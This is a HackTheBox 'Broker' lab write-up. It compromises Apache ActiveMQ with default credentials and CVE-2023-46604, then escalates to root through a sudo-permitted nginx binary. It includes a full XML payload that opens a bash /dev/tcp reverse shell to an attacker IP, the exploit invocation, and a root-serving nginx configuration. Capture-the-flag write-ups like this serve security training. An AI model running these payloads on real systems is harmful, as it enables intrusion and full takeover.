# HTB Broker Writeup

Begin by adding the machine IP to `/etc/hosts`.

```
nano /etc/hosts
CTRL + S
CTRL + X
```

![[HackTheBox/Broker/images/1.png]]

Conduct a port scan ->

Service + default script scan:

```
sudo nmap -sV -sC -Pn broker.htb
```

![[HackTheBox/Broker/images/2.png]]

Full port scan:

```
sudo nmap -p- -Pn --min-rate 10000 broker.htb
```

Identify all open ports:

![[HackTheBox/Broker/images/3.png]]

Service + script scan on discovered ports:

```
sudo nmap -p 22,80,1883,5672,8161,46311,61613,61614,61616 -Pn -sV -sC broker.htb
```

As you can see below, there are valuable results in place ->

![[HackTheBox/Broker/images/4.png]]

Vuln NSE scan:

```
sudo nmap -p 22,80,1883,5672,8161,46311,61613,61614,61616 -Pn --script vuln broker.htb
```

![[HackTheBox/Broker/images/5.png]]

There were a lot of HTTP servers, so I decided to check them manually.

On port 80, nginx works as a reverse proxy, so I will move on to the correlated ports.

`80/tcp    open  http       nginx 1.18.0 (Ubuntu)`

I tried to reach both Jetty (8161) and Apache ActiveMQ, yet it seems like overkill. We don't need such an operation; it can be seen from the title of the page that nginx routes to `Apache ActiveMQ`.

![[HackTheBox/Broker/images/6.png]]

To pass the HTTP authentication popup, let's try the vendor default username:password combination.

![[HackTheBox/Broker/images/7.png]]

Since I had never encountered that product in the Apache Foundation before, I preferred to analyze the HTML page source code and found `/admin` and `/demo` endpoints.

![[HackTheBox/Broker/images/8.png]]

Because I had already logged into the application, I was able to reach the management panel on my first attempt.

![[HackTheBox/Broker/images/9.png]]

I could not find any clues about vulnerabilities, but I searched for the product and used `searchsploit` to find a proper exploit.

![[HackTheBox/Broker/images/10.png]]

A web shell was suitable in this case, yet it did not work.

[exploit](https://github.com/cyberaguiar/CVE-2016-3088/blob/main/exploit_activemq.py)

![[HackTheBox/Broker/images/11.png]]

I manually searched for the version and discovered a convenient one.

![[HackTheBox/Broker/images/12.png]]

Since, as an attacker, we use a Linux environment, I compiled the exploit file via Go.

```
go build -o ActiveMQ-RCE main.go
```

The other parts are the same as the official GitHub page of the [exploit](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ?tab=readme-ov-file).

Instead of MSFconsole, I will apply the manual reverse shell method.

```
python3 -m http.server 8001
./ActiveMQ-RCE -i {Target_IP} -u http://{IP_Of_Hosted_XML_File}:8001/poc-linux.xml

Example:

./ActiveMQ-RCE -i 10.129.230.87 -u http://10.10.14.50:8001/poc-linux.xml
```

I encountered errors due to the structure of the poc-linux.xml file. Modify it as follows:

![[HackTheBox/Broker/images/13.png]]

```
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans
   http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/10.10.14.50/4444 0&gt;&amp;1</value>
            </list>
        </constructor-arg>
    </bean>
</beans>
```

Get reverse shell ->

![[HackTheBox/Broker/images/14.png]]

We can run the `nginx` binary as root via the `activemq` user ->

![[HackTheBox/Broker/images/15.png]]

Notice that we no longer need to upgrade the shell. If possible, `Penelope` handles everything automatically.

According to [GTFOBins](https://gtfobins.org/gtfobins/nginx/), sudo privilege escalation can be achieved through `nginx`.

![[HackTheBox/Broker/images/16.png]]

Let's send a request to reach the root flag and user flag.

Since nginx already works on port `80` as a reverse proxy, I changed the listening port to `1337`.

![[HackTheBox/Broker/images/17.png]]

Since I encountered errors when using the default nginx.conf, I created a separate configuration file to bind to a different port.

```
cat >/tmp/nginx2.conf <<EOF
user root;
http {
  server {
    listen 1337;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF

sudo nginx -c /tmp/nginx2.conf
```

Now send the request directly to the `/root/` and `/home/activemq/` directories to retrieve the flags.

```
curl broker.htb:1337/home/activemq/user.txt
curl broker.htb:1337/root/root.txt
```

![[HackTheBox/Broker/images/18.png]]
